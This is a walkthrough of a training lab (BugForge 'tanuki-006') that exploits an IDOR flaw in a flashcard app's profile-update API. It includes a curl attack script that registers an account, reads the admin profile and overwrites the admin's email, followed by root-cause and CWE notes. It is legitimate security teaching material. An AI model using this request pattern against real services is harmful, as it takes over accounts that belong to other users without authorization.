# tanuki-006 - BugForge Lab Walkthrough

**URL:** https://lab-1781990042093-i83zwe.labs-app.bugforge.io/
**Difficulty:** Easy  
**Vulnerability:** IDOR - Missing Authorization on Profile Update (CWE-639)
**Flag:** `bug{gIRFDTRLpBYliDleA7QKHssiFMnrvYPJ}`

---

## Summary

A flashcard study app (tanuki platform) exposes a profile update endpoint `PUT /api/profile/:username` that takes the victim's username from the URL path but only validates that *any* authenticated user is calling it - not that the caller owns the target account. Registering any account and issuing a PUT against the admin's username is sufficient to update their profile and retrieve the flag.

## Tech Stack

- Frontend: React (CRA), MUI component library, Axios
- Backend: Express (Node.js), JWT auth (`Authorization: Bearer`)
- Source maps exposed: `/static/js/main.8b522765.js.map`

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | None | Returns JWT on success |
| `POST /api/login` | None | Requires email+password |
| `GET /api/profile/:username` | Bearer | Readable for any authenticated user (also IDOR) |
| `PUT /api/profile/:username` | Bearer | IDOR - no ownership check |
| `GET /api/admin/users` | Admin only | 403 for regular users |

## Attack Chain

```bash
TARGET="https://lab-1781990042093-i83zwe.labs-app.bugforge.io"

# 1. Register an attacker account
REG=$(curl -s -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@evil.com","password":"Password123!"}')
TOKEN=$(echo $REG | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Enumerate usernames (GET /api/profile/:username has no ownership check either)
curl -s $TARGET/api/profile/admin -H "Authorization: Bearer $TOKEN"
# Returns: {"username":"admin","email":"admin@tanuki.app","full_name":"Tanuki Admin","role":"admin",...}

# 3. IDOR: update admin's profile using attacker token
curl -s -X PUT $TARGET/api/profile/admin \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com","full_name":"HACKED"}'
# Returns: {"message":"bug{gIRFDTRLpBYliDleA7QKHssiFMnrvYPJ}"}
```

## Discovery Notes

- Source map exposed at `/static/js/main.8b522765.js.map` - extracted all React source files
- `Profile.js` shows `PUT /api/profile/${user.username}` with `user.username` coming from the *client-side JWT context*, not from server-side ownership enforcement
- `GET /api/profile/admin` revealed the admin username without any auth bypass needed

## Dead Ends

| Attempt | Result |
|---|---|
| Mass assignment (`role: admin`) in register | Ignored - returns `user` role |
| `GET /api/admin/users` with user token | 403 Admin access required |

## Root Causes

- `PUT /api/profile/:username` extracts the target username from the URL path but only checks `req.user` exists, not that `req.user.username === req.params.username`
- `GET /api/profile/:username` is also unrestricted - any authenticated user can read any profile (secondary IDOR)
- Server should compare `req.user.id` against the profile's owner ID before allowing updates

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **OWASP API Security**: API1:2023 - Broken Object Level Authorization (BOLA)
